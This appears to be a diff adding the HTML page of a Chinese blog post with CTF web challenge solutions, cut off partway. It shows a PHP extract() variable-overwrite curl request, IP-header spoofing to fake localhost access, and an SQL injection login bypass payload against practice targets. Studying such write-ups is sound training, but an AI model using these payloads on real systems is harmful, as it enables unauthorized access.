@@ -1,0 +1,1497 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="zh-cn" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>CG CTF Web #2 &middot; wicsp&#39;s blog</title>
+  <meta name="title" content="CG CTF Web #2 &middot; wicsp&#39;s blog" />
+  
+  
+  <meta name="keywords" content="CTF, Web, " />
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/cg-ctf-web-2/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.446a8b9c076e66da0e80c76714e26dd9ec36f07c75a6f91f2ed5b9140c8f48bf53e431c5e426df98e3e593b9b3c6266a60d611aa69cce9f4811297f4d5772c6d.css"
+    integrity="sha512-RGqLnAduZtoOgMdnFOJt2ew28Hx1pvkfLtW5FAyPSL9T5DHF5CbfmOPlk7mzxiZqYNYRqmnM6fSBEpf01XcsbQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.b6411b5d4cd56c0068d34c4acbce043846adad56b824e3d486a06d3459aed2eb7f7413874b7871cc2c822c8c8834cbed944022918bcc8cca710a962167c36d32.js"
+    integrity="sha512-tkEbXUzVbABo00xKy84EOEatrVa4JOPUhqBtNFmu0ut/dBOHS3hxzCyCLIyINMvtlEAikYvMjMpxCpYhZ8NtMg==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj&#43;Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/cg-ctf-web-2/">
+  <meta property="og:site_name" content="wicsp&#39;s blog">
+  <meta property="og:title" content="CG CTF Web #2">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-02-07T22:35:36+08:00">
+    <meta property="article:modified_time" content="2020-02-07T22:35:36+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CG CTF Web #2">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "CG CTF Web #2",
+    "headline": "CG CTF Web #2",
+    
+    
+    "inLanguage": "zh-cn",
+    "url" : "http:\/\/localhost:1313\/posts\/cg-ctf-web-2\/",
+    "author" : {
+      "@type": "Person",
+      "name": "wicsp"
+    },
+    "copyrightYear": "2020",
+    "dateCreated": "2020-02-07T22:35:36\u002b08:00",
+    "datePublished": "2020-02-07T22:35:36\u002b08:00",
+    
+    "dateModified": "2020-02-07T22:35:36\u002b08:00",
+    
+    "keywords": ["CTF","Web"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1029"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="wicsp" />
+  
+  
+  
+  <link href="mailto:wicsp@gmail.com" rel="me" />
+  
+  
+  <link href="https://github.com/wicsp" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C3X2QLHQ9M"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-C3X2QLHQ9M');
+</script>
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>跳过正文</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">wicsp&rsquo;s blog</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+ 
+  
+   
+  
+ 
+
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/img/background.svg);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      CG CTF Web #2
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2020-02-07T22:35:36&#43;08:00">2020-02-07</time><span class="px-2 text-primary-500">&middot;</span><span>1029 字</span><span class="px-2 text-primary-500">&middot;</span><span title="预计阅读">5 分钟</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="wicsp" src="/img/blowfish_logo_hu_e74a130226122ae3.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      作者
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      wicsp
+    </div>
+    
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="mailto:wicsp@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/wicsp"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+    
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h2 class="relative group">0x00 <a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank">变量覆盖</a> 
+    <div id="0x00-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x00-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>给出代码如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;secret.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$pass</span> <span class="o">==</span> <span class="nv">$thepassword_123</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$theflag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><!-- more -->
+<p>其中重要的是这一句 <code>if ($pass == $thepassword_123)</code> ，题目名叫变量覆盖，猜想需要传入这两个变量覆盖默认的变量。</p>
+<p>在本地终端运行 <code>curl http://chinalover.sinaapp.com/web18/index.php -X POST -d &quot;pass=1&amp;thepassword_123=1&quot;</code></p>
+<p>成功取得 Flag</p>
+
+
+<h2 class="relative group">0x01 <a href="http://way.nuptzj.cn/php/index.php" target="_blank">PHP 是世界上最好的语言</a> 
+    <div id="0x01-php-%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x01-php-%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>又是这个域名，访问不了啊啊啊</p>
+
+
+<h2 class="relative group">0x02 <a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank">伪装者</a> 
+    <div id="0x02-%E4%BC%AA%E8%A3%85%E8%80%85" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x02-%E4%BC%AA%E8%A3%85%E8%80%85" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>通过搜索发现可以在 header 中加入 X-Forwarded-For: 127.0.0.1 达到本地登陆的效果，但是无效，加入 client-ip: 127.0.0.1 后成功</p>
+
+
+<h2 class="relative group">0x03 <a href="http://way.nuptzj.cn/web5/" target="_blank">HEADER</a> 
+    <div id="0x03-header" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x03-header" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>又又又又又又挂了</p>
+
+
+<h2 class="relative group">0x04 <a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank">上传绕过</a> 
+    <div id="0x04-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x04-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>在网页元素中发现 upload.php 文件，内容为 <code>Array ( ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</code></p>
+<p>上传一张图片试试，提示 <code>必须上传成后缀名为php的文件才行啊！</code></p>
+<p>做不来，各种姿势都尝试过了，以后再说。</p>
+
+
+<h2 class="relative group">0x05 <a href="http://chinalover.sinaapp.com/index.php" target="_blank">SQL 注入 1</a> 
+    <div id="0x05-sql-%E6%B3%A8%E5%85%A5-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0x05-sql-%E6%B3%A8%E5%85%A5-1" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>给出源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nx">pass</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mysql_connect</span><span class="p">(</span><span class="nx">SAE_MYSQL_HOST_M</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nx">SAE_MYSQL_PORT</span><span class="p">,</span><span class="nx">SAE_MYSQL_USER</span><span class="p">,</span><span class="nx">SAE_MYSQL_PASS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mysql_select_db</span><span class="p">(</span><span class="nx">SAE_MYSQL_DB</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">user</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">pass</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;select user from ctf where (user=&#39;&#34;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s2">&#34;&#39;) and (pw=&#39;&#34;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&#34;&#39;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="o">.</span><span class="nv">$sql</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span><span class="o">==</span><span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;&lt;p&gt;You are not admin!&lt;/p&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$query</span><span class="p">[</span><span class="nx">user</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>构造 <code>user=admin')#&amp;pass=1</code> 即可</p>
+
+
+<h2 class="relative group">0x06 <a href="http://chinalover.sinaapp.com/web21/" target="_blank">pass check</a> 
+    <div id="0x06-pass-check" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
